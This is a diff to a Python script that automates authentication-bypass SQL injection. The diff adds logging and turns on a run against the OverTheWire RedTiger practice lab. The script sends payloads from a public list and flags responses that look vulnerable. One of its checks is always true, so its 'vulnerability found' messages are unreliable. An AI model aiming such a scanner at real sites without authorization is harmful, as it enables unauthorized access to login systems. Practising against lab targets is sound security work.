@@ -7,6 +7,7 @@ from datetime import datetime
 # import sock
 # from database import create_database_for_Captures
 import sqlite3
+import logging
 
 
 ############################################################################
@@ -16,6 +17,8 @@ attack_type = "authentication bypass SQL injection"
 """ 
               Reference : https://github.com/payloadbox/sql-injection-payload-list 
               for The payloads"""
+
+logging.basicConfig(filename="SQLJ.log",level=logging.DEBUG)
 
 
 
@@ -50,6 +53,7 @@ async def auth_SQL_inj(urls):
             req = requests.get(url=urls,verify=False) #* Sends a request and set the verify flag as false
             if req.status_code == 200: #* If the host is up we inform the user
                 ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url: {urls}\n Do you want to send the above payload to the website? ")
+                logging.info(f"the host{urls} is up and returned status code with 200,Time:{datetime.now()}")
 
                 if ask.lower() == "y": #* if y
                     for line in sorted_payload.split("\n"): #* Create a for loop in the program
@@ -66,38 +70,46 @@ async def auth_SQL_inj(urls):
                         await asyncio.sleep(5) #! This prevent the program from crashing 
                         if "error" in ack.text: #* if the error word was in the test result we inform the user
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found|:", ack.text)
+                            logging.info(f"Could find the error word in the text response in the target:{urls}.This may indicates that it has some vulnerability in the backend.Time captured:{datetime.now()}")
                             
                         vuln = re.findall(pattern=pattern,string=ack.text,flags=re.IGNORECASE) #* use regex patterns for the better searching
                         htmlVULN = re.findall(pattern=htmlpattern,string=ack.text,flags=re.IGNORECASE) 
                         if vuln: #* if the regex pattern founds we inform the user
                             print(f"[{datetime.now()}]",Fore.RED + " | Vulnerability found Status: |", ack.text," | with the count of: |",len(vuln),"|Attack:|"+"|authentication bypass SQL injection|")
+                            logging.info(f"Could find vulnerability in the target:{urls}.This might not be accurate.Time:{datetime.now()}.testing parameters:(id,error)")
                             await asyncio.sleep(3) #* Stop the program for 5 sec
                         
                         if htmlVULN:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found:|", ack.text,"|with the count of|:",len(htmlVULN))
+                            logging.info(f"Could find vulnerability in the html response in the target(id,error): {urls}.Time captures:{datetime.now()}")
                             await asyncio.sleep(3)
                         
                         word = "id" in req.text #* inform the user the other results
                         errword = "error" in req.text
                         if word:
                             print(f"[{datetime.now()}]",Fore.GREEN + "|Vulnerability found with the rows Status:|:", word if word is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
+                            logging.info(f"Could find some testing parameters(id) in the target url:{urls},Time captured:{datetime.now()}")
                             await asyncio.sleep(3)
                         
                         if errword:
                             print(f"[{datetime.now()}]",Fore.RED + "|Vulnerability found in the Error based attack Status|:","|" ,errword if errword is True else "|Nothing found with the error basic attack|","|Attack:|","authentication bypass SQL injection")
+                            logging.info(f"Could find some testing parameters that appears to be injectable in the target(error):target:{urls},Time captured:{datetime.now()}")
                             await asyncio.sleep(3)
                             
                         
                             
                     if req.status_code == 302: #*If could even break to the website we inform the user
                         print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could found injectable area on the website with the keyword:","|",line,"|"+"|Attack:|"+"authentication bypass SQL injection")
+                        logging.info(f"[INFO]Could found injectable area on the website with the keyword:{line},Time captured:{datetime.now()},attack:{attack_type}")
                         done = True
                     
                     if "Admin" or "admin" in vuln or "Admin" or "admin" in ack.text or "Admin" or "admin" in htmlVULN:
                         print(f"[{datetime.now()}]",Fore.GREEN+"[INFO]Could connect to the website but did found injectable area on the website.","|Attack:|","authentication bypass SQL injection")
+                        logging.info(f"Could connect but found (admin) parameters in the target.attack:{attack_type},Time:{datetime.now()}")
                         
             else:
                 print(f"[{datetime.now()}]",Fore.RED+"Host is down","|Attack:|","authentication bypass SQL injection")
+                logging.error(f"Host is down,attack:{attack_type},Time:{datetime.now()}")
                 
         conn = sqlite3.connect("SQLJresult.db")
         cur = conn.cursor()
@@ -115,6 +127,7 @@ async def auth_SQL_inj(urls):
                     
     except Exception as e:
         print(f"{datetime.now()}",Fore.RED+"Error:",e,"|Attack:|",attack_type)
+        logging.error(f"An error occurred:{e},Time: {datetime.now()}")
         
     except KeyboardInterrupt:
         # print(f"[{datetime.now()}]","Exiting...")
@@ -169,4 +182,4 @@ async def auth_SQL_inj(urls):
 async def auth_main(urL):
     await auth_SQL_inj(urL)
 
-# asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
+asyncio.run(auth_main("https://redtiger.labs.overthewire.org/level1.php"))
